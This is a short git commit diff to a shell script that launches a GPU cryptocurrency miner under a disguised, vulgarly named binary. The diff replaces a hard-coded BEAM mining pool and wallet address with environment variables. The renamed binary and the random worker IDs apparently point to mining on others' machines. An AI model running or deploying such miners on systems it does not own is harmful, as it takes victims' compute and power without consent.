bf9d5d9e98d96a68154ab935951da33c29347e07
renilo <88342640+renilo@users.noreply.github.com>
2021-09-11 00:11:45 +0700

    Update kontol1.sh

--- kontol1.sh
+++ kontol1.sh
@@ -6,4 +6,4 @@ WORKER=$(echo $(shuf -i 1-100000 -n 1)-GPU)
 
 chmod +x memek
 
-./memek --algo BEAM-III --pool us-beam.2miners.com:5252 --user 7d227db8ee98ffc87d84d2ca37451cd49e6cb3d41fb948f8c432f9efc7d8d4f04b.$WORKER --ethstratum ETHPROXY --mode a
+./memek --algo BEAM-III --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY --mode a
